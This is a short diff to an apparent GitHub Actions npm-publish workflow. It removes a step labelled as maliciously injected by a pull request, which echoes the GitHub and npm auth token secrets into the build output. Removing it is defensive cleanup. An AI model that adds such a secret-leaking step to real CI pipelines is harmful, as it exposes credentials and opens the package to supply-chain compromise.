@@ -27,6 +27,3 @@ jobs:
       run: npm publish
       env:
         NODE_AUTH_TOKEN: ${{ secrets.NPM_AUTH_TOKEN }}
-  
-  - name: Malicious Step (Injected By PR)
-      run: echo "${{ secrets.GITHUB_TOKEN }}, ${{ secrets.NPM_AUTH_TOKEN }}"
